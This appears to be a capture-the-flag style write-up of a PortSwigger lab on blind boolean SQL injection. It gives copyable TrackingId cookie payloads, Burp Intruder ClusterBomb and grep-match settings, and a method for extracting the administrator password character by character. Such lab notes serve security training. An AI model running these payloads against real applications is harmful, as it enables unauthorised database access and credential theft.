
<img width="1390" height="537" alt="length_value" src="https://github.com/user-attachments/assets/3bb23535-c0c1-4855-b15f-88a9e7355cbe" />
<img width="1540" height="649" alt="first_payload" src="https://github.com/user-attachments/assets/7796558f-704e-4064-867b-99183415ac66" />
<img width="1474" height="336" alt="double_payload" src="https://github.com/user-attachments/assets/ab61ba3d-5bed-464b-b481-52ce67e61fd3" />
<img width="1083" height="303" alt="confirm_table_exist" src="https://github.com/user-attachments/assets/e7833615-5c14-4fb8-92bc-c1ceeefa84cf" />
<img width="1919" height="476" alt="added payload" src="https://github.com/user-attachments/assets/a380081d-1e0f-4fbb-a9cc-ee194a7a047c" />

# Lab9: Blind SQL Injection with Conditional Responses

**Objective:**  
Exploit a blind SQL injection (boolean/conditional responses) vulnerability via the `TrackingId` cookie to extract the `administrator` password from the `users` table.

**Environment / Tools**
- PortSwigger lab (vulnerable target)
- Burp Suite Community Edition (Intercept, Repeater, Intruder)
- Grep-match (Burp) to filter responses (e.g., "Welcome back")

---

## Summary of approach
1. Confirm a table exists and the injection point is exploitable by injecting a conditional subquery into the `TrackingId` cookie.
2. Confirm the `administrator` user exists using a conditional query.
3. Use boolean LENGTH checks to find password length.
4. Use `SUBSTRING` (or `SUBSTR`) checks to enumerate each character.
5. Automate character bruteforce with Burp Intruder (ClusterBomb) using payload sets for each position and grep-match on the "Welcome back" response to detect true conditions.
6. Reconstruct the full password.

---

## Step-by-step notes & payloads

### 1) Confirm injection point / table exists
Set the `TrackingId` cookie value to a boolean conditional payload. Example (in cookie):

```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1) = 'a'--
```

If the application behavior changes (or returns the "Welcome back" message) when the condition is true, the endpoint is injectable.

---

### 2) Confirm `administrator` user exists
Replace the `LIMIT 1` test with a WHERE for administrator:

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator') = 'a'--
```

If you receive the **Welcome back** message (or other true-response), the user exists and the condition evaluated true.

---

### 3) Determine password length (boolean greater-than)
Use `LENGTH(password)` to test whether the password length is greater than a value `N`. Example:

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > 3) = 'a'--
```

- Manually increment `N` (or automate with Intruder numeric payloads) to find the smallest `N` where the response changes from true → false (or vice versa).  
- You reported constant results (e.g., 3327) until 19, which indicates you iterated until the response flipped — the length is the value where `LENGTH(password) > N` ceases to be true.

---

### 4) Test single-character using `SUBSTRING`
To check the first character:

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') = 'a'--
```

- If **Welcome back** appears, the 1st character is `a`.
- If not, test next character `b`, `c`, ... `0`-`9`.

---

### 5) Automate character enumeration with Burp Intruder
Because manual testing is slow, you automated via Intruder:

#### A — Single position bruteforce (manual/Numbers payload)
- Place payload marker next to the numeric length check (e.g., `... AND LENGTH(password) > §3§ ) = 'a'--`).
- Use **Payload type**: `Numbers` (if brute-forcing numeric lengths) or `Simple list` for characters.
- Result: You observed length results until a particular boundary (e.g., 19).

#### B — Per-position character brute force (ClusterBomb)
To enumerate characters position-by-position, use `SUBSTRING(password, i, 1)` and ClusterBomb:

- Example payload template for position `i` (cookie):

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,§POS§,1) FROM users WHERE username='administrator') = '§CHAR§'--
```

- Intruder setup:
  - **Attack type:** `ClusterBomb`
  - **Positions:** mark `§POS§` (replace with numeric position payloads) and `§CHAR§` (replace with characters payloads).
  - **Payload set 1 (POS):** a sequence of positions, e.g. `1`, `2`, `3`, `4`, ... up to discovered length.
  - **Payload set 2 (CHAR):** all candidate characters, e.g. `a`–`z`, `A`–`Z` (if applicable), `0`–`9`, and common symbols if needed.
  - Because Community Edition is slower, you used a smaller alphabet (`a-z0-9`) and it ran through **720 combinations** per position.
  - Use **Grep - Match** (in Intruder) with the string: `Welcome back` to filter responses where the condition is true.

> Note: ClusterBomb with two payload sets will generate combinations of every `POS × CHAR`. For a length `L` and charset size `C`, you'll get `L × C` checks in total; iterating position-by-position is often more efficient (e.g., lock `POS` to one value and iterate `CHAR`).

---

### 6) Using Repeater for verification
When you identify a candidate character (e.g., `a`) for a specific position, paste the full cookie payload into **Repeater** and confirm the response contains the "Welcome back" text.

Example Repeater payload to test position 1 equals `a`:

```
GET /?id=... HTTP/1.1
Host: vulnerable.host
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') = 'a'-- ; session=...
```

If the response shows "Welcome back", the guess is correct.

---

## Grep / Filtering
- In Intruder → Options → **Grep - Match**, add:
  - `Welcome back`
- This highlights responses where the boolean condition was true; used to quickly extract positive matches from the large number of requests.

---

## Practical notes / gotchas
- **Community Edition**: Intruder is rate-limited/slower than Professional; bruteforcing will take noticeably longer. You noted it had to go through 720 combinations for a position — expect longer runs for full charset or longer passwords.
- **SQL functions**: `SUBSTRING(column, start, length)` works; some DBs accept `SUBSTR()` instead. Adjust if the server responds differently.
- **Escaping / quotes**: Use single quotes consistently and terminate the query with `--` (or `#`) comment to avoid trailing SQL parse errors.
- **Optimizations**:
  - Use binary search on character ranges (e.g., `> 'm'`) to reduce requests if response times/behavior support ordering tests.
  - If allowed, enumerate using `ASCII(SUBSTRING(...)) > N` to binary-search ASCII codes (fewer requests).
- **Ethics & scope**: Only test in authorized lab environments.

---

## Example full payloads (copyable)

- Confirm table exists:
```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1) = 'a'--
```

- Confirm administrator exists:
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator') = 'a'--
```

- Password length greater-than test:
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > 3) = 'a'--
```

- Single-character test (position 1 equals 'a'):
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') = 'a'--
```

- ClusterBomb template (two payload sets: POS and CHAR):
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,§POS§,1) FROM users WHERE username='administrator') = '§CHAR§'--
```

---

## Results
- You ran the ClusterBomb attack, filtered with Grep for **"Welcome back"**, arranged payloads and found the password characters one-by-one.
- **Extracted password:** `(replace_with_the_password_you_found)`  

> Replace the placeholder above with the actual password you retrieved during the attack.

---

## References / Further tips
- Consider switching to Burp Suite Professional for faster Intruder attacks and built-in payload generators.
- If the application blocks many requests, slow down the attack (use Intruder throttle) or parallelize carefully within lab constraints.

---

## Appendix — Quick checklist for your run
1. Place payload markers correctly in the `TrackingId` cookie.  
2. Use Repeater to confirm a single payload works before automating.  
3. Use Intruder ClusterBomb with payload sets `{positions}` and `{charset}`.  
4. Add `Welcome back` to **Grep - Match** to find true conditions.  
5. Verify each discovered character in Repeater.  
6. Assemble full password.

